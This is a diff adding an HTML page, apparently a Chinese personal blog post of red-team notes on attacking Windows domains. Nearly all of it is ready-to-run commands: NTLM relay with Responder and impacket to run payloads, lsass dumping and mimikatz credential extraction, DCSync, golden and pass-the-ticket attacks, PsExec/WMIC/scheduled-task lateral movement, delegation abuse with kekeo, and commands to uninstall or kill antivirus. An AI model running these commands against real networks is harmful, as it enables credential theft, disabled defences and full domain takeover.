@@ -1,0 +1,886 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, shrink-to-fit=no">
+    <meta name="referrer" content="origin">
+    <meta http-equiv="Cache-Control" content="no-transform">
+    <meta http-equiv="Cache-Control" content="no-siteapp">
+    <title>
+        
+            🐥小鸡
+        
+    </title>
+    <link rel="shortcut icon" href="#"/>
+
+    <link type="text/css" rel="stylesheet" href="/font/LongCang.css">
+    <link type="text/css" rel="stylesheet" href="/font/Monda.css">
+    <link type="text/css" rel="stylesheet" href="/font/NotoSansSC.css">
+    <link type="text/css" rel="stylesheet" href="/font/NotoSerifSC.css">
+    <link type="text/css" rel="stylesheet" href="/font/Playball.css">
+    <link type="text/css" rel="stylesheet" href="/font/PTMono.css">
+    <link type="text/css" rel="stylesheet" href="/font/Roboto.css">
+    <link type="text/css" rel="stylesheet" href="/font/RobotoSlab.css">
+    <link type="text/css" rel="stylesheet" href="/font/Rosario.css">
+    <link type="text/css" rel="stylesheet" href="/font/UbuntuMono.css">
+
+    <link type="text/css" rel="stylesheet" href="/css/base.css">
+    <link type="text/css" rel="stylesheet" href="/css/code.css">
+
+    <script type="text/javascript" src="/js/jquery-3.4.1.min.js"></script>
+<meta name="generator" content="Hexo 6.3.0"></head>
+<body>
+    <a id="cover"></a>
+    <link type="text/css" rel="stylesheet" href="/css/post.css">
+<div id="header" class="header">
+    <div class="vertical">
+        <div class="inner">
+            
+                <h1 class="header-subtitle">🐥小鸡</h1>
+                <div class="header-subinfo">
+                    <p class="article-info-text">
+                        <span>
+                            <i class="iconfont icon-time"></i> 发表时间：2023-10-27
+                        </span>
+                        
+                            <span id="/2023/10/27/🐥小鸡/" class="leancloud_visitors" data-flag-title="🐥小鸡">
+                                <i class="iconfont icon-browse"></i> 阅读：<sapn class="leancloud-visitors-count"></span>
+                            </span>
+                        
+                        <span>
+                            <i class="iconfont icon-interactive"></i> 评论：<span class="valine-comment-count" data-xid="/2023/10/27/🐥小鸡/"></span>
+                        </span>  
+                    </p>
+                    
+                        
+                            <span class="category-color">内网</span>
+                        
+                    
+                    
+                        
+                            <span class="tag-color">内网</span>
+                        
+                    
+                </div>
+            
+        </div>
+    </div>
+    
+</div>
+<div id="container">
+    
+        <!-- 文章页面 -->
+        <div id="article">
+            <div class="toc"></div>
+            <div class="article-body">
+                <p>s</p>
+<p>这里来记录一下思路把</p>
+<p>首先是你能进来一个机器是吧</p>
+<p>看看机器有啥信息，在没在域里</p>
+<p>ipconifig  &#x2F;all  ，看看有几个网卡</p>
+<p>net time &#x2F;domain</p>
+<p>ping </p>
+<p>如果是cs那就更方便了不用说了</p>
+<p>如果是msf，可以load powerview,ps1  load mimikatz来帮助收集信息</p>
+<p>powershell_exec   </p>
+<p>拿到ip </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">  namp全家桶   </span><br><span class="line"></span><br><span class="line">sudo  nmap -p- **ip** --min-rate=10000    等扫出来结果，扫出来结果在细细扫</span><br><span class="line"></span><br><span class="line">sudo  namp -sCV -sS -p 445,80 --script vuln **ip** --min-rate=10000    看看有没有啥能用的东西</span><br><span class="line">  </span><br><span class="line">sudo  namp -Pn -sS -T4 --open --script smb-security-mode -p 445 **ip** 扫描没开启smb的机器，这个该过程像是在钓鱼，获取<span class="built_in">hash</span>或者获取shell</span><br><span class="line">没开启的就可以</span><br><span class="line">-&gt; sudo responder  -I eth0     那边访问共享就能获取到ntlm</span><br><span class="line">-&gt; impacket MultiRelayx.py拿下shell  在usr/share/responder/tools 里面 </span><br><span class="line">   先python MultiRelayx.py -t target -u all</span><br><span class="line">   然后毒化 responder  修改 responder.conf 把smb 和http 都改成Off</span><br><span class="line">   之后就 sudo responder -I eth0</span><br><span class="line">   那边用smb 这边就能看到 获取shell了</span><br><span class="line">-&gt; smbrelayx.py 中继攻击 ,还像上面一样首先先毒化responder 接下来，可以生成cs msf，payload</span><br><span class="line">   python smbrelayx.py -h target -e ./payload.exe</span><br><span class="line">-&gt; ntlmrelayx.py中继,这个和上面哪个都是impacket里面的脚本，ntlmrelayx.py 直接用现有的 <span class="built_in">hash</span> 去尝试重放指定机    器上的指定服务（需同样关闭 responder 的 smb 和 http） python ntlmrelayx.py -t &lt;Client ip&gt;</span><br><span class="line">   还可以用CS 等生成 powershell payload ，然后输入</span><br><span class="line">   python ntlmrelayx.py -t &lt;ip&gt; -c “&lt;payload&gt;”</span><br><span class="line">   </span><br><span class="line"></span><br><span class="line">-&gt; 如果获得低权限用户<span class="built_in">hash</span> -&gt; 提权</span><br><span class="line">-&gt; 如果获得高权限用户<span class="built_in">hash</span> -&gt; 1.要dump下来他的密码，查看域内所有密码，<span class="built_in">hash</span></span><br><span class="line">                               -&gt;&gt; procdump.exe -accepteula -ma lsass.exe lsass.dmp 从进程中弄出lsass.dmp文件</span><br><span class="line">                               -&gt;&gt; mimikatz <span class="string">&quot;privilege::debug&quot;</span> <span class="string">&quot;sekurlsa::minidump lsass.dmp&quot;</span> <span class="string">&quot;sekurlsa::logonPasswords&quot;</span> <span class="built_in">exit</span></span><br><span class="line">                               -&gt;&gt; mimikatz <span class="string">&quot;privilege::debug&quot;</span> <span class="string">&quot;token::elevate&quot;</span> <span class="string">&quot;sekurlsa::logonpasswords&quot;</span> <span class="string">&quot;lsadump::sam&quot;</span> <span class="string">&quot;exit&quot;</span></span><br><span class="line">                               -&gt;&gt; PPLdump64.exe &lt;lsass.exe|lsass_pid&gt; lsass.dmp</span><br><span class="line">mimikatz <span class="string">&quot;!+&quot;</span> <span class="string">&quot;!processprotect /process:lsass.exe /remove&quot;</span> <span class="string">&quot;privilege::debug&quot;</span></span><br><span class="line"><span class="string">&quot;token::elevate&quot;</span> <span class="string">&quot;sekurlsa::logonpasswords&quot;</span> <span class="string">&quot;!processprotect</span></span><br><span class="line"><span class="string">/process:lsass.exe&quot;</span> <span class="string">&quot;!-&quot;</span> </span><br><span class="line"><span class="comment">#with mimidriver.sys 得带上这个才行，看得带上这个才行</span></span><br><span class="line">                        -&gt; 卷影拷贝</span><br><span class="line">                        -&gt; token窃取</span><br><span class="line">                        -&gt; dpapi解密</span><br><span class="line"></span><br><span class="line">  </span><br></pre></td></tr></table></figure>
+
+<p>  你说接下来干嘛 ， 看看有没有主机漏洞</p>
+<p>  win7 永恒之蓝    2003 2008  MS08-068 能不能通过主机漏洞拿下 ，当然这个声音很大</p>
+<p>其实还可以干嘛？</p>
+<p>看看 如果开放能登陆的那种端口看看能否得到<strong>账户名</strong>和<strong>密码</strong>能得到都是好的怎么做</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">可以crackmapexec smb **ip** -u <span class="string">&#x27;&#x27;</span> -p <span class="string">&#x27;&#x27;</span>   --<span class="built_in">users</span>    枚举用户名</span><br><span class="line">    crackmapexec smb **ip** -u <span class="string">&#x27;&#x27;</span> -p <span class="string">&#x27;&#x27;</span>   --rid-brute   看看有没有空smb共享</span><br></pre></td></tr></table></figure>
+
+<p>certutil 还可用于从互联网下载文件。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil.exe -urlcache -<span class="built_in">split</span> -f http://example.com/a.txt</span><br></pre></td></tr></table></figure>
+
+<h2 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h2><h3 id="Pass-The-Ticket"><a href="#Pass-The-Ticket" class="headerlink" title="Pass The Ticket"></a><strong>Pass The Ticket</strong></h3><p>最主要的就是dump hash下来吗</p>
+<p>来说说mimikatz的使用</p>
+<p>导出hash</p>
+<h3 id="DCsync"><a href="#DCsync" class="headerlink" title="DCsync"></a>DCsync</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">查询域内具有 DCSync 权限的用户</span><br><span class="line">AdFind.exe -s subtree -b &quot;DC=redteam,DC=red&quot; -sdna nTSecurityDescriptor -sddl+++ -sddlfilter ;;;&quot;Replicating Directory Changes&quot;;; -recmute</span><br><span class="line">AdFind.exe -s subtree -b &quot;DC=redteam,DC=red&quot; -sdna nTSecurityDescriptor -sddl+++ -sddlfilter ;;;&quot;DS-Replication-Get-Changes&quot;;; -recmute</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">导出域内指定用户的信息(包括哈希值)</span></span><br><span class="line">mimikatz &quot;lsadump::dcsync /domain:whoamianony.org /user:administrator&quot; exit </span><br><span class="line">mimikatz &quot;lsadump::dcsync /domain:whoamianony.org /user:administrator /csv&quot; exit</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">导出域内所有用户的信息(包括哈希值)</span></span><br><span class="line">mimikatz &quot;lsadump::dcsync /domain:whoamianony.org /all&quot;   exit</span><br><span class="line">mimikatz &quot;lsadump::dcsync /domain:whoamianony.org /all /csv&quot;  exit</span><br></pre></td></tr></table></figure>
+
+<p>上线了msf之后也可以</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">load mimikatz</span><br><span class="line">kiwi_cmd &quot;lsadump::dcsync /domain:whoamianony.org /user:krbtgt&quot;</span><br><span class="line"><span class="meta prompt_">-&gt; </span><span class="language-bash">使用mimikatz的命令</span></span><br><span class="line">得到krbtgt的hash之后</span><br><span class="line">golden_ticket_create -u Administrator -d redteam.red -s S-1-5-21-1315137663-3706837544-1429009142 -k 6be58bfcc0a164af2408d1d3bd313c2a -t gold.tck</span><br></pre></td></tr></table></figure>
+
+<p>如果获得缓存文件例如 owa.ccache 可以用mimikatz</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mimikatz &quot;kerberos::ptc C:\Windows\system32\owa.ccache&quot; exit</span><br><span class="line">这个跟直接加载票据是一样的原理</span><br><span class="line"><span class="meta prompt_">-&gt;</span><span class="language-bash">这个东西可以用ms14-068获得，或者是用sam_the_admin得到</span></span><br></pre></td></tr></table></figure>
+
+<p>使用mimikatz（管理员权限）将内存的票据导出：（运行以下命令会在当前目录生成多个服务的票据文件）</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::tickets /export&quot; exit</span><br></pre></td></tr></table></figure>
+
+<p>从中选择一个目标系统自己的，移动到黑客机器上。</p>
+<p>将票据文件注入内存：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz &quot;kerberos::ptt &quot;[0;4ee98c]-2-0-60a00000-Administrator@krbtgt-GOD.ORG.kirbi&quot;</span><br></pre></td></tr></table></figure>
+
+<p>将最高权限的票据文件注入内存后，将列出远程计算机系统的文件目录：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir \\192.168.3.25\C$</span><br></pre></td></tr></table></figure>
+
+<p>遇到密码错误的问题那么我们把IP换成目标主机名：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir \\mary-pc\c$</span><br></pre></td></tr></table></figure>
+
+<p>如果要清除内存中的票据使用mimikatz运行下面的命令：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::purge</span><br></pre></td></tr></table></figure>
+
+<h3 id="mimikatz-黄金票据"><a href="#mimikatz-黄金票据" class="headerlink" title="mimikatz 黄金票据"></a>mimikatz 黄金票据</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">lsadump::lsa /patch     //专用于在域控制器上导出用户密码或hash</span><br><span class="line"></span><br><span class="line">//kerberos::golden /user:[username] /domain:[domain] /sid:[sid] /krbtgt:[krbtgt&#x27;s Hash] /ticket:ticket.kirbi </span><br><span class="line"></span><br><span class="line">凭证注入 </span><br><span class="line">#kerberos::ptt &lt;票据文件&gt;</span><br><span class="line">kerberos::ptt ticket.kirbi</span><br></pre></td></tr></table></figure>
+
+<p><strong>使用 kekeo 进行票据传递</strong></p>
+<p>kekeo 下载地址：<a target="_blank" rel="noopener" href="https://github.com/gentilkiwi/kekeo/releases/">https://github.com/gentilkiwi/kekeo/releases/</a></p>
+<p>kekeo 需要使用<a target="_blank" rel="noopener" href="https://cloud.tencent.com/act/pro/domain-sales?from_column=20065&from=20065">域名</a>、用户名、NTLM Hash 三者配合生成票据，再将票据导入，从而直接连接远程计算机。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">域名：god.org</span><br><span class="line">用户名：administrator</span><br><span class="line">NTLM Hash：ccef208c6485269c20db2cad21734fe7</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">普通权限即可</span><br><span class="line">kekeo.exe &quot;tgt::ask /user:administrator /domain:god.org /ntlm:ccef208c6485269c20db2cad21734fe7&quot;</span><br></pre></td></tr></table></figure>
+
+<h2 id=""><a href="#" class="headerlink" title=""></a></h2><h3 id="PTH"><a href="#PTH" class="headerlink" title="PTH"></a>PTH</h3><h4 id="psexec"><a href="#psexec" class="headerlink" title="psexec"></a>psexec</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">PsExec 包含在 PsTools 工具包中，下载地址：https://download.sysinternals.com/files/PSTools.zip</span><br><span class="line"></span><br><span class="line">PsExec 主要用于大批量 Windows 主机的维护，在域环境下效果尤其好。（因为 PsExec 是 Windows 提供的工具，所以杀毒软件将其列入白名单中）</span><br><span class="line"></span><br><span class="line">因为使用 PsExec 通过命令行环境与目标机器建立连接，甚至控制目标机器，而不需要通过远程桌面（RDP）进行图形化的控制。</span><br><span class="line"></span><br><span class="line">PsExec 的基本原理是：通过管道在远程目标主机上创建一个 psexec 服务，并在本地磁盘中生成一个名为”PSEXESVC“的二进制文件，然后通过 psexec 服务运行命令，运行结束后删除服务。</span><br><span class="line"></span><br><span class="line">首先，需要获取目标操作系统的交互式 Shell。在建立了 ipc$ 的情况下：</span><br><span class="line"></span><br><span class="line">net use \\192.168.3.21 /u:god\administrator Admin12345</span><br><span class="line">PsExec.exe -accepteula \\192.168.3.21 -s cmd.exe   # -accepteula  第一次运行 PsExec 会弹出确认框，使用该参数就不会弹出确认框</span><br><span class="line">                                                   # -s      以System权限运行远程进程，获得一个System权限的交互式Shell，如果不用这个参数，那么会获得一个administrator权限的shell </span><br><span class="line">                                                   </span><br><span class="line">如果没有建立 ipc$，PsExec 有两个参数可以通过指定的账号和密码进行远程连接：</span><br><span class="line">PsExec.exe \\192.168.3.21 -u god\administrator -p Admin12345 cmd.exe</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">-u  域\用户名</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">-p  密码</span></span><br><span class="line">PsExec.exe \\192.168.3.21 -u god\administrator -p Admin12345 cmd /c &quot;ipconfig&quot; 远程执行命令回显</span><br></pre></td></tr></table></figure>
+
+<h4 id="wmiexec"><a href="#wmiexec" class="headerlink" title="wmiexec"></a>wmiexec</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">wce使用</span><br><span class="line">注意：wce是从内存中读取，pwdump是从数据库SAM中读取的！</span><br><span class="line">-l 列出登录的会话和NTLM凭据（默认值）</span><br><span class="line">-s 修改当前登录会话的NTLM凭据 参数：&lt;用户名&gt;:&lt;域名&gt;:&lt;LM哈希&gt;:&lt;NT哈希&gt;</span><br><span class="line">-r 不定期的列出登录的会话和NTLM凭据，如果找到新的会话，那么每5秒重新列出一次</span><br><span class="line">-c 用一个特殊的NTML凭据运行一个新的会话 参数：</span><br><span class="line">-e 不定期的列出登录的会话和NTLM凭据，当产生一个登录事件的时候重新列出一次</span><br><span class="line">-o 保存所有的输出到一个文件 参数:&lt;文件名&gt;</span><br><span class="line">-i 指定一个LUID代替使用当前登录会话 参数:</span><br><span class="line">-d 从登录会话中删除NTLM凭据 参数:</span><br><span class="line">-a 使用地址 参数: &lt;地址&gt;</span><br><span class="line">-f 强制使用安全模式</span><br><span class="line">-g 生成LM和NT的哈希 参数&lt;密码&gt;</span><br><span class="line">-K 缓存kerberos票据到一个文件（unix和windows wce格式）</span><br><span class="line">-k 从一个文件中读取kerberos票据并插入到windows缓存中</span><br><span class="line">-w：读内存中 WDisgest 安全包维护的当前登录账户的明文密码。</span><br><span class="line">-v 详细输出</span><br><span class="line"></span><br><span class="line">信息收集</span><br><span class="line">搜索系统运行服务 wmic service list brief |more</span><br><span class="line">搜索运行中的程序 wmic process list brief |more</span><br><span class="line">搜索启动程序 wmic startup list brief |more</span><br><span class="line">搜索共享驱动盘 wmic netuse list brief |more</span><br><span class="line">搜索用户帐户 wmic useraccount list brief |more</span><br><span class="line">搜索计算机DC wmic ntdomain list brief</span><br><span class="line">搜索登录用户 wmic logon list brief |more</span><br><span class="line">搜索已安装的安全更新 wmic qfe list brief |more</span><br><span class="line">搜索时区 wmic timezone list brief |more</span><br><span class="line"></span><br><span class="line">卸载反病毒程序</span><br><span class="line">wmic product where &quot;name like &#x27;%forit%&#x27; &quot; get name</span><br><span class="line">wmic product where name=&quot; &quot; call uninstall</span><br><span class="line">停止运行反病毒服务</span><br><span class="line">wmic process where name=&quot; &quot; call terminate</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">目标端口开放 135 端口，且允许随机一个高位端口进行通信</span><br><span class="line">直接使用系统自带的 WMIC 进行连接，执行命令是无回显的，常常需要将执行的返回结果写入文件，再通过文件读取的方式将回显带回来。</span><br><span class="line">WMIC /Node:192.168.159.130 /user:test\administrator /password:admin123! Process Call Create &quot;cmd /c whoami &gt; C:\Users\Test2019\AppData\Local\Temp\rs.log&quot;</span><br><span class="line">利用 net use 查看文件</span><br><span class="line">net use \\192.168.159.130\c$</span><br><span class="line">type \\192.168.159.130\c$\Users\Test2019\AppData\Local\Temp\rs.log</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Canterlot/article/details/126695173">内网横移之WMIexec_Canterlot的博客-CSDN博客</a></p>
+<h4 id="atexec（创建计划任务）"><a href="#atexec（创建计划任务）" class="headerlink" title="atexec（创建计划任务）"></a>atexec（创建计划任务）</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">端口开放139、445</span><br><span class="line">防火墙没有屏蔽上面端口</span><br><span class="line">1. 建立IPC链接到目标主机</span><br><span class="line">2. 拷贝要执行的命令脚本到目标主机</span><br><span class="line">3. 查看目标时间，创建计划任务（at、schtasks）定时执行拷贝到的脚本</span><br><span class="line">4. 删除IPC链接</span><br><span class="line"></span><br><span class="line">目标操作系统 &lt; Windows2012</span><br><span class="line">net use \\10.0.0.1\ipc$ &quot;123@.com&quot; /user:tencent\ad</span><br><span class="line">ministrator # 建立ipc连接：</span><br><span class="line">copy add.bat \\10.0.0.1\c$  #拷贝执行文件到目标机器</span><br><span class="line">at \\10.0.0.1 15:47 c:\add.bat    #添加计划任务</span><br><span class="line"></span><br><span class="line">目标操作系统 &gt;=Windows2012</span><br><span class="line">net use \\10.0.0.1\ipc$ &quot;admin!@#45&quot; /user:god.org\ad</span><br><span class="line">ministrator # 建立ipc连接：</span><br><span class="line">copy add.bat \\10.0.0.1\c$ #复制文件到其C盘</span><br><span class="line">schtasks /create /s 10.0.0.1 /ru &quot;SYSTEM&quot; /tn adduser /sc DAILY /tr c:\add.bat /F #创建adduser任务对应执行文件</span><br><span class="line">schtasks /run /s 10.0.0.1 /tn adduser /i #运行adduser任务</span><br><span class="line">schtasks /delete /s 10.0.0.1 /tn adduser /f#删除adduser任务</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="evil-winrm"><a href="#evil-winrm" class="headerlink" title="evil-winrm"></a>evil-winrm</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm </span><br><span class="line">开启 5895 5896</span><br><span class="line">evil-winrm -i 192.168.1.19 -u administrator -H 32196B56FFE6F45E294117B91A83BF38</span><br><span class="line">evil-winrm -i 192.168.1.19 -u administrator -p Ignite@987 -s /opt/privsc/powershell</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="xfreerdp"><a href="#xfreerdp" class="headerlink" title="xfreerdp"></a>xfreerdp</h3><p>FreeRDP 是一款开源的远程桌面系统，支持多种平台， 在 ubuntu 中使用 FreeRDP 可以很方便的登录到 windwos 远程桌面中。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">xfreerdp -f 192.168.1.10 -u administrator -p 123456 /sound</span><br><span class="line"></span><br><span class="line">-f：表示全屏（切换全屏的快捷键为：Ctrl + Alt + Enter）</span><br><span class="line">host：远程服务器地址</span><br><span class="line">port：端口，默认为 3389</span><br><span class="line">-u username：用户名</span><br><span class="line">-p password：密码</span><br><span class="line">sound 加载声卡驱动</span><br><span class="line"></span><br><span class="line">cliprdr（开启粘贴功能）</span><br><span class="line">--plugin cliprdr</span><br><span class="line"></span><br><span class="line">rdpdr（开启本地文件夹映射为远程服务器磁盘功能）</span><br><span class="line">--plugin rdpdr --data disk:&lt;Name&gt;:&lt;Path&gt; --</span><br><span class="line"></span><br><span class="line">例如将本地 /home/username/share 作为共享文件夹：</span><br><span class="line">xfreerdp -f --plugin rdpdr --data disk:username:~/share -- 192.168.1.10 -u administrator -p 123456</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">获取票据 </span><br><span class="line">mimikatz &quot;privilege::debug sekurlsa::tickets /export sekurlsa::tickets /export&quot; exit</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="三种委派"><a href="#三种委派" class="headerlink" title="三种委派"></a>三种委派</h3><h4 id="约束委派"><a href="#约束委派" class="headerlink" title="约束委派"></a>约束委派</h4><p>1、使用 Adfind <strong>查询约束委派的用户</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">AdFind.exe -h 10.10.10.8 -u sqlserver -up Server12345 -b <span class="string">&quot;DC=redteam,DC=red&quot;</span> -f <span class="string">&quot;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&quot;</span> cn distinguishedName msds-allowedtodelegateto</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Powerview</span></span><br><span class="line">Get-DomainUser -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto</span><br><span class="line">Get-DomainComputer -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto</span><br><span class="line"></span><br><span class="line"><span class="comment">#ADSearch</span></span><br><span class="line">ADSearch.exe --search <span class="string">&quot;(&amp;(objectCategory=computer)(msds-allowedtodelegateto=*))&quot;</span> --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json</span><br></pre></td></tr></table></figure>
+
+
+
+<p>2.利用 kekeo 请求该用户的 TGT：<code>TGT_redteam-iis@REDTEAM.RED_krbtgt~redteam.red@REDTEAM.RED.kirbi</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kekeo.exe </span><br><span class="line">tgt::ask /user:redteam-iis /domain:redteam.red /password:Server12345 /ticket:administrator.</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">用 kekeo 请求该用户的 TGT 命令解释： tgt::ask /user:redteam-iis /domain:redteam.red /password:Server12345 /ticket:administrator.kirbi /user: 服务用户的用户名 /password: 服务用户的明文密码 /domain: 所在域名 /ticket: 指定票据名称，不过这个参数没有生效，可以忽略 得到服务用户 TGT：TGT_redteam-iis@REDTEAM.RED_krbtgt~redteam.red@REDTEAM.RED.kirbi 使用这张 TGT 通过伪造 s4u 请求以 administrator 用户身份请求访问 AD-2008 CIFS的 ST tgs::s4u /tgt:TGT_redteam-iis@REDTEAM.RED_krbtgt~redteam.red@REDTEAM.RED.kirbi /user:Administrator@redteam.red /service:cifs/AD-2008.redteam.red S4U2Self 获取到的 ST1 以及 S4U2Proxy 获取到的 AD-2008 CIFS 服务的 ST2 会保存在当前目录下</span><br></pre></td></tr></table></figure>
+
+<p>使用这张 TGT (<code>TGT_redteam-iis@REDTEAM.RED_krbtgt~redteam.red@REDTEAM.RED.kirbi</code>) 获取域机器的 ST：<code>TGS_Administrator@redteam.red@REDTEAM.RED_cifs~AD-2008.redteam.red@REDTEAM.RED.kirbi</code></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kekeo.exe &quot;tgs::s4u /tgt:TGT_sqlserver@REDTEAM.RED_krbtgt~redteam.red@REDTEAM.RED.kirbi /user:Administrator@redteam.red /service:cifs/owa.redteam.red&quot;</span><br><span class="line"></span><br><span class="line">klist purge 清空票据</span><br></pre></td></tr></table></figure>
+
